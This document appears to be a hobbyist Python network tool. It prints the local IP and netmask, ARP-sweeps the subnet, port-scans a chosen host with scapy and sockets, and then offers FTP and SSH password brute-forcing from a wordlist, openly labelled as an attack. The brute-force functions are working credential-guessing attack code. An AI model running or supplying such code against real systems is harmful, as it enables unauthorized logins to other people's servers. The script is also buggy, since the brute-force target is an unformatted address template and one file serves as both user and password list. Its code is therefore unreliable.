import socket, sys
from netifaces import interfaces, ifaddresses, AF_INET
from scapy.all import *
import pyfiglet
import ftplib
import paramiko
from scapy.layers.inet import Ether, IP, ICMP, TCP
from scapy.layers.l2 import ARP

ascii_banner = pyfiglet.figlet_format("IP  AND  PORT  SCANNER")
print(ascii_banner)

print("Dear user! This program will show you your IP and netmask.\nIf you'd like to, scan for other devices in your network and discover open ports on them.\nLet's start!\n")

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('8.8.8.8', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

ip_my = str(get_ip())

print('Your IP is: ', ip_my)

print("Find the interface with your IP:")
for ifaceName in interfaces():
    addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}])]
    print('%s: %s' % (ifaceName, ', '.join(addresses)))
    #ip_my = addresses

print("As you now know your interface, you can see your netmask:")
for ifaceName in interfaces():
    addresses = [i['netmask'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'netmask':'No IP addr'}])]
    print('%s: %s' % (ifaceName, ', '.join(addresses)))
    #nmask = addresses

#print('Your IP:', ip_my[0])
#print('Your netmask: ', nmask[0])

next_step = str.upper(input('Continue with scaning for other devices? Y/N: '))

if next_step == 'Y':
    print('Scaning...\n')
else:
    print('Program terminated.')
    quit()

ip_range = ip_my.split('.')
ip_range[3] = '{}'
ip_scan = '.'.join(ip_range)

# quite sure I can fix it by using 'for i in range', the netmask calc needs to be done better...
# range_max = nmask[0].split('.')
# m1 = '{0:08b}'.format(int(range_max[0])) + '{0:b}'.format(int(range_max[1])) + '{0:b}'.format(
#     int(range_max[2])) + '{0:08b}'.format(int(range_max[3]))
# m2 = m1.count('0')

# max range 50 for testig in limited NAT network
for i in range(1,200):
    ip = ip_scan.format(i)
    pakiet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
    dane = srp1(pakiet, timeout=1, verbose=0)

    if dane:
        print('IP addres: {}'.format(str(dane.psrc)))

print('Scaning done!\n')

next_step2 = str.upper(input('Would you like to scan ports of the selected IP? Y/N: '))
if next_step2 == 'N':
    print('Program terminated.')
    sys.exit()
else:
    while next_step2 == 'Y':
        to_scan = input("Enter host IP to scan: ")
        to_scan_IP = socket.gethostbyname(to_scan)

        print("-" * 60)
        print("Please wait, scanning remote host", to_scan_IP)
        print("-" * 60)

        # ports limited to 100, for testing need the script to work faster
        try:
            for port in range(1, 100):
                package = IP(dst=to_scan) / TCP(dport=[port], flags="S")
                rec, wrong = sr(package, timeout=1, verbose=0)
                service = f"{str(rec[0]).split(' ')[7][6:]}"
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((to_scan_IP, port))
                if result == 0:
                    print("Port {}: Open".format(port), service)
                sock.close()
        except KeyboardInterrupt:
            print("You pressed Ctrl+C")
            sys.exit()

        except socket.gaierror:
            print('Hostname could not be resolved. Exiting')
            sys.exit()

        except socket.error:
            print("Couldn't connect to server")
            sys.exit()

        next_step2 = str.upper(input('Would you like to scan ports of another selected IP? Y/N: '))

next_step3 = str.upper(input('Bruteforce available for FTP & SSH. Continue? Y/N: '))
if next_step3 == 'Y':
    select = str.upper(input('Select service (ftp or ssh): '))
else:
    print('Program terminated.')
    sys.exit()

with open('/home/kali/Desktop/pass.txt') as f:
    users = f.read().splitlines()
with open('/home/kali/Desktop/pass.txt') as f:
    passwords = f.read().splitlines()

def brute_ftp():
    target = ip_scan
    for user in users:
        for password in passwords:
            print(f"Trying> {user}:{password}")

            try:
                ftp_server = ftplib.FTP()
                ftp_server.connect(target, 21, timeout=2)
                ftp_server.login(user, password)
                print("[+] Login successful.")
                ftp_server.close()
            except Exception as exc:
                print("[-] Brute-force attack failed!")

def brute_ssh():
    target = ip_scan
    port = 22

    ssh_server = paramiko.SSHClient()
    ssh_server.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    ssh_server.load_system_host_keys()

    for user in users:
        for password in passwords:
            try:
                print(f"Trying> {user}:{password}")
                ssh_server.connect(target, port, user, password)
                print("[+] Login successful.")
                ssh_server.close()
            except Exception as exc:
                print("[-] Brute-force attack failed!")
                pass

if select == 'FTP':
    brute_ftp()
    print("\nThat's it for now... Working on making it better :)\nBye! ")
elif select == 'SSH':
    brute_ssh()
    print("\nThat's it for now... Working on making it better :)\nBye! ")